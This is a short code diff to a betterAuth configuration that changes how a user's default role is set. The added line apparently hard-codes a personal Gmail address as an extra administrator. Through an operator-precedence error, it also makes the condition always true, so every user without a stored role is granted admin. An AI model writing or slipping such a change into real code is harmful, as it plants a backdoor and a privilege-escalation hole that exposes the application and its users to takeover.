@@ -27,7 +27,7 @@ export const auth = betterAuth({
                     resolve({
                         data: {
                             ...user,
-                            role: user.role || (user.email === process.env.MAIN_ADMIN_EMAIL ? 'admin' : 'user')
+                            role: user.role || (user.email === process.env.MAIN_ADMIN_EMAIL || 'vvsitprogrammer@gmail.com' ? 'admin' : 'user')
                         }
                     }))
             }
